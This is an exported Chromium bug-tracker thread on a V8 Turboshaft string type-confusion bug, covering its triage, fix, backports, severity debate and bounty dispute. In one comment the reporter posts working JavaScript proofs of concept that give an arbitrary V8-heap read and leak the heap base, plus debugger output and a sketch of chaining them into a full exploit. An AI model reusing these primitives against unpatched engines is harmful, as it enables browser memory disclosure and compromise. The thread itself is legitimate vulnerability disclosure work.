# Security: SEGV in turboshaft-loop-peeling

| Field | Value |
|-------|-------|
| **Issue ID** | [41491373](https://issues.chromium.org/issues/41491373) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P2 |
| **Component** | Blink>JavaScript, Blink>JavaScript>Compiler |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **CVE IDs** | CVE-2016-9651, CVE-2017-5053 |
| **Reporter** | ki...@gmail.com |
| **Assignee** | dm...@chromium.org |
| **Created** | 2024-01-15 |
| **Bounty** | $8,000.00 |

## Description

VULNERABILITY DETAILS
## INTRODUCE
After bisect, it was determined that following commit caused this problem.

- Commit Info
    - Version: 91113
    - link: https://crrev.com/bde0ed46a0fd612b6126988c54c1100c56a80b7a
- Commit Message

```
commit bde0ed46a0fd612b6126988c54c1100c56a80b7a
Author: Nico Hartmann <nicohartmann@chromium.org>
Date:   Wed Nov 22 12:23:35 2023 +0100

    [turboshaft] Re-enable parts of the disabled CSA pipeline changes (1)

    Bug: v8:12783, chromium:1489500
    Change-Id: I072787c3353dabfb8aae74c5eae93b25d0e65e09
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5053297
    Reviewed-by: Darius Mercadier <dmercadier@chromium.org>
    Auto-Submit: Nico Hartmann <nicohartmann@chromium.org>
    Commit-Queue: Nico Hartmann <nicohartmann@chromium.org>
    Commit-Queue: Darius Mercadier <dmercadier@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#91113}

```

- Commit Info
    - Version: 90703
    - link: https://crrev.com/0aec2b50a0c5b600470d6c20858d69d20d58e374 
- Commit Message

```
commit 0aec2b50a0c5b600470d6c20858d69d20d58e374
Author: Darius M <dmercadier@chromium.org>
Date:   Tue Oct 31 16:06:05 2023 +0100

    Reland "[turboshaft] Implement Loop Peeling"
    
    This is a reland of commit 3b084cc30429bb01329715c8ef043ebbc7a776c5
    
    This CL was reverted because of binary size increase. This is expected
    since it adds a new phase to Turboshaft.
    We'll look into reducing Turboshaft binary-size in the mid-term
    future, but for now we have to live with some binary size increases.
    
    Original change's description:
    > [turboshaft] Implement Loop Peeling
    >
    > Bug: v8:12783
    > Change-Id: I95a1bd80adec0433cae8a50bc4d671de29413744
    > Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/4935413
    > Commit-Queue: Darius Mercadier <dmercadier@chromium.org>
    > Reviewed-by: Nico Hartmann <nicohartmann@chromium.org>
    > Cr-Commit-Position: refs/heads/main@{#90693}
    
    Bug: v8:12783
    Change-Id: I0032121aef723c0564184f4f1c281e74d082cf80
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/4999945
    Commit-Queue: Darius Mercadier <dmercadier@chromium.org>
    Auto-Submit: Darius Mercadier <dmercadier@chromium.org>
    Reviewed-by: Nico Hartmann <nicohartmann@chromium.org>
    Commit-Queue: Nico Hartmann <nicohartmann@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#90703}

```

## CRASH LOG
- Debug output

```bash
# CMD: /tmp/d8-linux-debug-v8-component-91829/d8 --allow-natives-syntax --turboshaft-loop-peeling --stress-gc-during-compilation poc.js
# OUTPUT ==============================================================
102 102
Received signal 11 SEGV_ACCERR 122e626f6f65

```

## Other
Please note to include the flags `--allow-natives-syntax --turboshaft-loop-peeling --stress-gc-during-compilation` for clusterfuzz classification.

VERSION
Tested on v8 version: 12.1.0 - 12.2.0

REPRODUCTION CASE
1. Download debug v8 from: gs://v8-asan/linux-debug/d8-linux-debug-v8-component-91829.zip
2. Run: `d8 --allow-natives-syntax --turboshaft-loop-peeling --stress-gc-during-compilation poc.js`

FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION
Type of crash: tab

CREDIT INFORMATION
Reporter credit: Zhenghang Xiao (@Kipreyyy)

## Attachments

- [poc.js](attachments/poc.js) (text/plain, 450 B)
- deleted (application/octet-stream, 0 B)
- [poc.js](attachments/poc_53290269.js) (text/plain, 450 B)

## Timeline

### [Deleted User] (2024-01-15)

[Empty comment from Monorail migration]

### ki...@gmail.com (2024-01-15)

[Comment Deleted]

### ki...@gmail.com (2024-01-15)

VULNERABILITY DETAILS
## INTRODUCE
After bisect, it was determined that following commit caused this problem.

- Commit Info
    - Version: 91113
    - link: https://crrev.com/bde0ed46a0fd612b6126988c54c1100c56a80b7a
- Commit Message

```
commit bde0ed46a0fd612b6126988c54c1100c56a80b7a
Author: Nico Hartmann <nicohartmann@chromium.org>
Date:   Wed Nov 22 12:23:35 2023 +0100

    [turboshaft] Re-enable parts of the disabled CSA pipeline changes (1)

    Bug: v8:12783, chromium:1489500
    Change-Id: I072787c3353dabfb8aae74c5eae93b25d0e65e09
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5053297
    Reviewed-by: Darius Mercadier <dmercadier@chromium.org>
    Auto-Submit: Nico Hartmann <nicohartmann@chromium.org>
    Commit-Queue: Nico Hartmann <nicohartmann@chromium.org>
    Commit-Queue: Darius Mercadier <dmercadier@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#91113}

```

- Commit Info
    - Version: 90703
    - link: https://crrev.com/0aec2b50a0c5b600470d6c20858d69d20d58e374 
- Commit Message

```
commit 0aec2b50a0c5b600470d6c20858d69d20d58e374
Author: Darius M <dmercadier@chromium.org>
Date:   Tue Oct 31 16:06:05 2023 +0100

    Reland "[turboshaft] Implement Loop Peeling"
    
    This is a reland of commit 3b084cc30429bb01329715c8ef043ebbc7a776c5
    
    This CL was reverted because of binary size increase. This is expected
    since it adds a new phase to Turboshaft.
    We'll look into reducing Turboshaft binary-size in the mid-term
    future, but for now we have to live with some binary size increases.
    
    Original change's description:
    > [turboshaft] Implement Loop Peeling
    >
    > Bug: v8:12783
    > Change-Id: I95a1bd80adec0433cae8a50bc4d671de29413744
    > Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/4935413
    > Commit-Queue: Darius Mercadier <dmercadier@chromium.org>
    > Reviewed-by: Nico Hartmann <nicohartmann@chromium.org>
    > Cr-Commit-Position: refs/heads/main@{#90693}
    
    Bug: v8:12783
    Change-Id: I0032121aef723c0564184f4f1c281e74d082cf80
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/4999945
    Commit-Queue: Darius Mercadier <dmercadier@chromium.org>
    Auto-Submit: Darius Mercadier <dmercadier@chromium.org>
    Reviewed-by: Nico Hartmann <nicohartmann@chromium.org>
    Commit-Queue: Nico Hartmann <nicohartmann@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#90703}

```

## CRASH LOG
- Debug output

```bash
# CMD: /tmp/d8-linux-debug-v8-component-91829/d8 --allow-natives-syntax --turboshaft-loop-peeling --stress-gc-during-compilation poc.js
# OUTPUT ==============================================================
102 102
Received signal 11 SEGV_ACCERR 122e626f6f65

```

## Other
Please note to include the flags `--allow-natives-syntax --turboshaft-loop-peeling --stress-gc-during-compilation` for clusterfuzz classification.

VERSION
Tested on v8 version: 12.1.0 - 12.2.0

REPRODUCTION CASE
1. Download debug v8 from: gs://v8-asan/linux-debug/d8-linux-debug-v8-component-91829.zip
2. Run: `d8 --allow-natives-syntax --turboshaft-loop-peeling --stress-gc-during-compilation poc.js`

FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION
Type of crash: tab

CREDIT INFORMATION
Reporter credit: Zhenghang Xiao (@Kipreyyy)

### ki...@gmail.com (2024-01-15)

[Empty comment from Monorail migration]

### ki...@gmail.com (2024-01-15)

[Empty comment from Monorail migration]

### ki...@gmail.com (2024-01-16)

Hello, any update?

### cl...@chromium.org (2024-01-17)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5550185867837440.

### cl...@chromium.org (2024-01-17)

[Empty comment from Monorail migration]

### cl...@chromium.org (2024-01-17)

Detailed Report: https://clusterfuzz.com/testcase?key=5550185867837440

Fuzzer: None
Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: UNKNOWN READ
Crash Address: 0x7d9975726161
Crash State:
  Builtins_InterpreterEntryTrampoline
  Builtins_InterpreterEntryTrampoline
  Builtins_JSEntryTrampoline
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=90692:90693

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5550185867837440

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


A recommended severity was added to this bug. Please change the severity if it is inaccurate.

### [Deleted User] (2024-01-17)

[Empty comment from Monorail migration]

### ki...@gmail.com (2024-01-18)

Please cc Darius(dmercadier@chromium.org), he should be the owner of this issue

### [Deleted User] (2024-01-18)

Setting milestone and target because of medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2024-01-18)

Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### za...@google.com (2024-01-18)

Assign this bug to dmercadier@chromium.org per https://crbug.com/chromium/1518396#c11. Can you please help take a look?Thanks!

### am...@chromium.org (2024-01-18)

[Empty comment from Monorail migration]

[Monorail components: Blink>JavaScript Blink>JavaScript>Compiler]

### am...@chromium.org (2024-01-18)

[Description Changed]

### am...@chromium.org (2024-01-18)

adding additional compiler folks to cc: 

### ha...@google.com (2024-01-19)

[Empty comment from Monorail migration]

### dm...@chromium.org (2024-01-19)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2024-01-22)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/afc18842029d5629fccda99485c0dc44a71fb3c5

commit afc18842029d5629fccda99485c0dc44a71fb3c5
Author: Darius M <dmercadier@chromium.org>
Date: Mon Jan 22 16:01:48 2024

[turboshaft] Fix wrong constant folding of strings map loads

is_stable should only be used on non-primitive maps. Strings can
change maps despite their maps being "stable".

Bug: chromium:1518396
Change-Id: I3bcb33223f6d08df30d97da6eca2b06efb052960
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5217051
Auto-Submit: Darius Mercadier <dmercadier@chromium.org>
Reviewed-by: Toon Verwaest <verwaest@chromium.org>
Commit-Queue: Darius Mercadier <dmercadier@chromium.org>
Cr-Commit-Position: refs/heads/main@{#91942}

[add] https://crrev.com/afc18842029d5629fccda99485c0dc44a71fb3c5/test/mjsunit/compiler/regress-crbug-1518396.js
[modify] https://crrev.com/afc18842029d5629fccda99485c0dc44a71fb3c5/src/compiler/turboshaft/machine-optimization-reducer.h


### dm...@chromium.org (2024-01-22)

[Empty comment from Monorail migration]

### dm...@chromium.org (2024-01-22)

The bug is that we used to constant fold a map check for strings, which was wrong because string maps could change. This lead in turn to reading from a SeqString as if it was a ThinString, which lead to loading from a more or less random memory location (where "more or less random" probably means "interpreting the string characters as an address").

I guess that this can be exploited, so I'm setting the severity to high, and requesting the fix in https://crbug.com/chromium/1518396#c20 to be backmerged to 122 and 121.

### [Deleted User] (2024-01-22)

[Empty comment from Monorail migration]

### [Deleted User] (2024-01-22)

[Empty comment from Monorail migration]

### ki...@gmail.com (2024-01-23)

[Comment Deleted]

### ki...@gmail.com (2024-01-23)

[Comment Deleted]

### ki...@gmail.com (2024-01-23)

[Comment Deleted]

### ki...@gmail.com (2024-01-23)

## V8 Exploit Technical Details

This vulnerability is sufficient for exploitation. I have already written a quick proof of concept (PoC) to demonstrate that it can read from any address in the V8 heap and leak the base address of the V8 heap.

1. Arbitrary memory leak

Poc as follows.

```js
//flags: --allow-natives-syntax --turboshaft-loop-peeling --stress-gc-during-compilation 

function get_thin_string(a, b) {
    var str = a + b;
    var o = {};
    o[str];
    return str;
}
var str = get_thin_string("\x41\x42\x43\x44");
function CheckCS(idx) {
    return str.charCodeAt(idx).toString(16);
}
%PrepareFunctionForOptimization(CheckCS);
CheckCS();
%OptimizeFunctionOnNextCall(CheckCS);
%DebugPrint(str);
for(i = 0; i < 16; i++) {
    print(CheckCS(i));
}
%SystemBreak();
```

Prior to optimization, the str object is represented as a ThinString. Consequently, during optimization, Turboshaft interprets the fourth four-bytes of str as a pointer. This leads to the optimization of direct memory access to the memory location pointed to by the pointer in those fourth four-bytes.

However, post-optimization, the str object undergoes relocation to the old space and transforms into a SeqString. This SeqString stores the content of the string which is located from the 12th byte of this object. As a result, manipulation of the given string content allows for control over the memory address to access, enabling access to any memory location.

```text
Memory Layout of ThinString
| four-bytes map ptr | four-bytes | four-bytes string length | four-bytes backing string ptr |

Memory Layout of SeqString
| four-bytes map ptr | four-bytes | four-bytes string length | `string-length` bytes string content |
```

This POC can lead to a directly memory access to v8-heap-base + 0x44434241:

```gdb
DebugPrint: 0x23930020aac5: [String]: >"ABCDundefined"
0x239300000425: [Map] in ReadOnlySpace
 - map: 0x2393000004c5 <MetaMap (0x23930000007d <null>)>
 - type: THIN_ONE_BYTE_STRING_TYPE
 - instance size: 16
 - elements kind: HOLEY_ELEMENTS
 - enum length: invalid
 - stable_map
 - non-extensible
 - back pointer: 0x239300000061 <undefined>
 - prototype_validity cell: 0
 - instance descriptors (own) #0: 0x239300000701 <DescriptorArray[0]>
 - prototype: 0x23930000007d <null>
 - constructor: 0x23930000007d <null>
 - dependent code: 0x2393000006dd <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0


Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
0x00007f3cc37441c0 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────
*RAX  0x2
*RBX  0x110d0000226d ◂— 0x350200000100000d /* '\r' */
*RCX  0x239300000000 ◂— 0x40000
*RDX  0x239300000061 ◂— 0x4
*RDI  0x23930011ae41 ◂— 0xcd000006cd001043
*RSI  0x239300103c85 ◂— 0x550000023a00103c
 R8   0x0
*R9   0x2d
*R10  0xffffffff
*R11  0x5
*R12  0x239344434241 ◂— 0x0             <---------------- ACCESSED MEMORY ADDRESS
*R13  0x555edfd5d080 —▸ 0x7f3c6374ea80 (Builtins_AdaptorWithBuiltinExitFrame) ◂— push rbp
*R14  0x239300000000 ◂— 0x40000
*R15  0x7ffc028ff5a0 —▸ 0x7f3c63796f26 (Builtins_InterpreterEntryTrampoline+742) ◂— mov rcx, rax
*RBP  0x7ffc028ff5c8 —▸ 0x7ffc028ff638 —▸ 0x7ffc028ff668 —▸ 0x7ffc028ff6d0 —▸ 0x7ffc028ff710 ◂— ...
*RSP  0x7ffc028ff5a8 —▸ 0x239300103c85 ◂— 0x550000023a00103c
*RIP  0x7f3cc37441c0 ◂— mov r9d, dword ptr [r12 - 1] /* 0xffba41ff244c8b45 */
──────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────
 ► 0x7f3cc37441c0    mov    r9d, dword ptr [r12 - 1]
   0x7f3cc37441c5    mov    r10d, 0xffffffff
   0x7f3cc37441cb    cmp    r9, r10
   0x7f3cc37441ce    jbe    0x7f3cc37441dd                <0x7f3cc37441dd>
```

2. V8 heap base address leak

We can modify the poc to leak the base address of v8 heap very easily.

```js
function get_thin_string(a, b) {
  var str = a + b;
  var o = {};
  o[str];
  return str;
}
var str = get_thin_string("\1\0\0\0");
function CheckCS() {
    return str.charCodeAt(8).toString(16);
}
%PrepareFunctionForOptimization(CheckCS);
CheckCS();
%OptimizeFunctionOnNextCall(CheckCS);
print(CheckCS());
%DebugPrint(str);
// %SystemBreak();
//flags: --allow-natives-syntax --turboshaft-loop-peeling --stress-gc-during-compilation 
```
- output
```
➜  v8 git:(main) ✗ out/x64.release/d8  --allow-natives-syntax --turboshaft-loop-peeling --stress-gc-during-compilation leak_v8_base.js
1862 //-------> v8 heap base addr!!!

DebugPrint: 0x18620019aebd: [String] in OldSpace: #\x01\x00\x00\x00undefined
```


### [Deleted User] (2024-01-23)

This high+ V8 security issue with stable impact requires a lightweight post mortem. Please take some time to answer questions asked in this form [1] to help us improve V8 security. [1] https://docs.google.com/forms/d/e/1FAIpQLSdSMCiEpIFLLFkMbgtulK1sf1B-idQmkFaA4XP2Rz5mN1cqWg/viewform?usp=pp_url&entry.307501673=1518396&entry.364066060=External&entry.958145677=Android&entry.958145677=Chrome&entry.958145677=Fuchsia&entry.958145677=Linux&entry.958145677=Mac&entry.958145677=Windows&entry.958145677=Lacros&entry.763880440=Stable&entry.1678852700=High&entry.763402679=Blink>JavaScript,Blink>JavaScript>Compiler&entry.975983575=dmercadier@chromium.org Please ensure to copy the full link, as otherwise some issue meta data might not be populated automatically. 

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### dm...@chromium.org (2024-01-23)

Actually, it looks like I was too conservative in https://crbug.com/chromium/1518396#c22 when setting the severity to high.

As far as I can see, this bug can only be used to get arbitrary reads, but no writes. As per https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/severity-guidelines.md, this should thus be Severity-Medium: "Medium severity bugs allow attackers to read or modify limited amounts of information, or are not harmful on their own but potentially harmful when combined with other bugs. This includes information leaks that could be useful in potential memory corruption exploits, or exposure of sensitive user information that an attacker can exfiltrate."

Please let me know if I missed something and you disagree.

### ki...@gmail.com (2024-01-23)

[Comment Deleted]

### ki...@gmail.com (2024-01-23)

re https://crbug.com/chromium/1518396#c30

My personal suggestion is to conservatively classify it as high-risk and then let v8 security decide (for example, you can CC saelo or stephen to take a look). The reasons are as follows:

1. From my analysis, this vulnerability is at least an excellent arbitrary address read primitive, which can leak any content on the v8 heap.
This will allow attackers to forge malformed objects on the v8 heap (such as an array with a length of -1)
and then leak it to user space through another fakeobj vulnerability, thereby achieving a complete exploit.
So, although from the chromium security standards, information leakage seems to be just medium-risk, in the context of v8, it can easily lead to much greater impact, and I think it should be considered separately.

2. Secondly, although the type confusion between thin and seq strings here seems unable to cause out-of-bounds writing, in the case of v8 JIT or ExternalString confusion (e.g., WTF::String), it is still possible to cause more significant impact.
For example, CVE-2016-9651 [0] and CVE-2017-5053 [1] both used string out-of-bounds read vulnerabilities to achieve out-of-bounds writing and complete exploits.
So it's still not impossible here, and I think it's reasonable to conservatively set it to high.
[0] https://paper.seebug.org/325/#_1
[1] https://i.blackhat.com/USA-19/Wednesday/us-19-Feng-The-Most-Secure-Browser-Pwning-Chrome-From-2016-To-2019-wp.pdf

### sa...@chromium.org (2024-01-23)

Thanks for this report! I agree that OOB reads typically lead to RCE in V8 (because usually, you'd read a Tagged value or something similar), and that strings can also be dangerous even though they are read-only per spec [1]. For this particular bug I don't have the full picture, but from what I'm reading here (correct me if wrong), it sounds like the following is true:
- The bug _always_ leads to a type confusion between two String objects
- The only (relevant) operation that can be performed on the confused object is a string character read (because JS strings are immutable, so can't be written)

In that case, it does seem like the bug can only ever lead to a read of primitive data (i.e. `char`, basically), and so Severity_Medium seems correct in that case. However, we would definitely be interested to know if there was a way to turn this type of bug into memory corruption!

[1] e.g. https://googleprojectzero.blogspot.com/2019/05/trashing-flow-of-data.html

### ki...@gmail.com (2024-01-23)

I would like to correct something to ensure that we have a consistent understanding.

“it does seem like the bug can only ever lead to a read of primitive data (i.e. char, basically)”

The charCodeAt() method of String values returns an integer between 0 and 65535 representing the UTF-16 code unit at the given index. So, although it reads "char" out of bounds, it does not encounter common string-related issues in exploitation, such as "\0 truncation," as demonstrated in my previous proof of concept (please see comment https://crbug.com/chromium/1518396#c28). It can read the content of any address on the V8 heap and leak the content entirely.

Furthermore, currently, only arbitrary address reads can be achieved on the V8 heap, which serves as a prerequisite for fake object manipulation. Whether it can be converted into an out-of-bounds write is still a matter of research, for example, through techniques like externalString for obfuscation, thereby expanding potential exploitation scenarios. However, at the moment, this still appears to be a valuable vulnerability, so I consider this to be a **high-quality V8 report** :)

### ki...@gmail.com (2024-01-23)

By the way, saelo@, could you help me assign https://bugs.chromium.org/p/chromium/issues/detail?id=1520200 and https://bugs.chromium.org/p/chromium/issues/detail?id=1520697?

https://crbug.com/chromium/1520200 here is an interesting vulnerability, and I believe it might be a potential Use-After-Free (UAF) issue that may require some race conditions to trigger (sometimes even running the proof of concept continuously for up to an hour... so I don't think it's suitable for sorting with ClusterFuzz). However, I have been able to print stack traces and provide a basic analysis on debug builds downloaded from different machines.

### ki...@gmail.com (2024-01-23)

Also, Darius@, Thanks for your quick fix :) 

### sa...@chromium.org (2024-01-23)

Yes, it's definitely a vulnerability and a high-quality report! :)

### [Deleted User] (2024-01-23)

Merge review required: M121 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), govind (iOS), matthewjoseph (ChromeOS), danielyip (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2024-01-23)

Merge approved: your change passed merge requirements and is auto-approved for M122. Please go ahead and merge the CL to branch 6261 (refs/branch-heads/6261) manually. Please contact milestone owner if you have questions.
Merge instructions: https://chromium.googlesource.com/chromium/src.git/+/refs/heads/main/docs/process/merge_request.md
Owners: eakpobaro (Android), eakpobaro (iOS), ceb (ChromeOS), pbommana (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### dm...@chromium.org (2024-01-24)

Replies to https://crbug.com/chromium/1518396#c38:

1. Medium severity security issue
2. https://chromium-review.googlesource.com/c/v8/v8/+/5217051
3. It hasn't rolled in Chromium yet, so it would make sense to wait a few days
4. no
5.
6. no

### cl...@chromium.org (2024-01-24)

ClusterFuzz testcase 5550185867837440 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=91941:91942

If this is incorrect, please add the ClusterFuzz-Wrong label and re-open the issue.

### gi...@appspot.gserviceaccount.com (2024-01-24)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/eca9c1c66a11a5a20407dbc83ed344a746da3b4e

commit eca9c1c66a11a5a20407dbc83ed344a746da3b4e
Author: Darius M <dmercadier@chromium.org>
Date: Mon Jan 22 16:01:48 2024

Merged: [turboshaft] Fix wrong constant folding of strings map loads

is_stable should only be used on non-primitive maps. Strings can
change maps despite their maps being "stable".

Bug: chromium:1518396
(cherry picked from commit afc18842029d5629fccda99485c0dc44a71fb3c5)

Change-Id: I0a37233b80b2405c24def0596f7c5360e97c7df2
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5233401
Commit-Queue: Darius Mercadier <dmercadier@chromium.org>
Auto-Submit: Darius Mercadier <dmercadier@chromium.org>
Reviewed-by: Nico Hartmann <nicohartmann@chromium.org>
Cr-Commit-Position: refs/branch-heads/12.2@{#2}
Cr-Branched-From: 6eb5a9616aa6f8c705217aeb7c7ab8c037a2f676-refs/heads/12.2.281@{#1}
Cr-Branched-From: 44cf56d850167c6988522f8981730462abc04bcc-refs/heads/main@{#91934}

[add] https://crrev.com/eca9c1c66a11a5a20407dbc83ed344a746da3b4e/test/mjsunit/compiler/regress-crbug-1518396.js
[modify] https://crrev.com/eca9c1c66a11a5a20407dbc83ed344a746da3b4e/src/compiler/turboshaft/machine-optimization-reducer.h


### [Deleted User] (2024-01-24)

LTS Milestone M120

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:
1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?



For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### dm...@chromium.org (2024-01-24)

Replies to https://crbug.com/chromium/1518396#c43:

1. The issues exists since 120.
2. No, it's not related to anything more recent than 120.

(==> backmerging to LTS makes sense IMO)

### am...@chromium.org (2024-01-26)

M121 merge approved for https://crrev.com/c/5217051, please merge to 12.1-lkgr at your earliest convenience. 
M121 Stable cut is occurring this morning, so giving the timing on when this was landed in Chromium and my review, it's understood this may not be merged today and can instead be shipped in the following week's update of M121. 

### am...@chromium.org (2024-01-26)

fix was already merged to M122, so removing that label 

### gi...@appspot.gserviceaccount.com (2024-01-29)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/af0bfb50924bae64af324cd9d020ebb9852ba9e5

commit af0bfb50924bae64af324cd9d020ebb9852ba9e5
Author: Darius M <dmercadier@chromium.org>
Date: Mon Jan 22 16:01:48 2024

Merged: [turboshaft] Fix wrong constant folding of strings map loads

Bug: chromium:1518396, v8:12783
(cherry picked from commit afc18842029d5629fccda99485c0dc44a71fb3c5)

Change-Id: I4f0527ee31c13076f76addc5b57615a08c2629fc
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5239034
Auto-Submit: Darius Mercadier <dmercadier@chromium.org>
Reviewed-by: Nico Hartmann <nicohartmann@chromium.org>
Commit-Queue: Darius Mercadier <dmercadier@chromium.org>
Cr-Commit-Position: refs/branch-heads/12.1@{#55}
Cr-Branched-From: b74ef6f2cd2fe60c91abcd3271b661547a47ca4f-refs/heads/12.1.285@{#1}
Cr-Branched-From: 32857fbeb042c27010127aa02bbfaffcc0bf0829-refs/heads/main@{#91313}

[add] https://crrev.com/af0bfb50924bae64af324cd9d020ebb9852ba9e5/test/mjsunit/compiler/regress-crbug-1518396.js
[modify] https://crrev.com/af0bfb50924bae64af324cd9d020ebb9852ba9e5/src/compiler/turboshaft/machine-optimization-reducer.h


### sr...@google.com (2024-01-29)

[Empty comment from Monorail migration]

### sr...@google.com (2024-01-29)

Adjusting the labels for merge completion to m121.

### am...@google.com (2024-02-02)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### ki...@gmail.com (2024-02-02)

Hi, Amy, this is a high-quality V8 vulnerability report. The reward amount seems a bit low. Could you please take another look?
 

### am...@chromium.org (2024-02-02)

Hi Kipreyyy, while we did take the comments about this being a "high-quality report" consideration and also while your information in https://crbug.com/chromium/1518396#c28 was helpful, the impact of this issue itself appears to be an arbitrary read. Since arbitrary OOB read can turn into memory corruption here, did not consider this OOB read to be significantly mitigated to the extent an information disclosure. Also, while the information you provided in https://crbug.com/chromium/1518396#c28 and following was helpful and insightful, it was provided after the bug was fixed. While we will considerer reports for a higher reward when an exploit is provided after the bug is fixed. Key information about the security impact and potential exploitability is expected to be provided in the original report or an immediate follow-up, not almost two weeks after the initial report and when the bug is already resolved.
As such, the VRP Panel considered this to be a sufficient reward amount for this report. 

### ki...@gmail.com (2024-02-02)

Hi, Amy.
Thanks for the explanation, but from the link that saelo and I provided, oob read in v8 is often powerful enough to exploit, but it's really difficult and requires more research on exploiting. Moreover, we provide a primitive for reading arbitrary addresses, which is part of the exploit, and this is a v8 vulnerability affecting the Chrome release version. I think this should be eligible for part of the reward for exploiting the vulnerability. If allowed, please let the VRP team Think about it and I will accept your final conclusion anyway.

### am...@google.com (2024-02-02)

[Empty comment from Monorail migration]

### is...@google.com (2024-02-02)

This issue was migrated from crbug.com/chromium/1518396?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink>JavaScript, Blink>JavaScript>Compiler]
[Monorail components added to Component Tags custom field.]

### am...@chromium.org (2024-02-08)

Hi Kipreyyy, the Chrome VRP Panel has reassessed your report as requested and has decided that the original reward amount is sufficient for this report. 
This was demonstrated to be an arbitrary read which we extended to you the full baseline reward amount for demonstration of that based on the information that was provided in your original report and leading up to the time of fix. 

### rz...@google.com (2024-02-12)

Marking as not applicable for LTS M120 because the CL that introduced the issue landed in 121.

### dm...@chromium.org (2024-02-13)

rzanoni@: please see Comment #45: this issue exists since 120 rather than 121. It's easier to reproduce since a CL that landed in 121, but the underlying issue has been here since 120.

### rz...@google.com (2024-02-13)

dmercadier@, thanks, I missed this comment. Changing the labels to still process the CLs for 120 LTS.

### pe...@google.com (2024-02-27)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)



### na...@google.com (2024-02-27)

Note: Based on comment#45, the merge is not applicable to LTS-114.

### vo...@google.com (2024-03-04)

Answering the questionaire for M120:

1. One <https://crrev.com/c/5320119>
2. Low - small conflicts
3. M121, M122
4. Yes

### ki...@gmail.com (2024-03-07)

Hi, amy, it looks like this is a stable vulnerability, can I get a CVE number and acknowledgment?

### am...@chromium.org (2024-03-07)

Hello, apologies this issue got overlooked during that release for CVE and release notes acknowledgement.
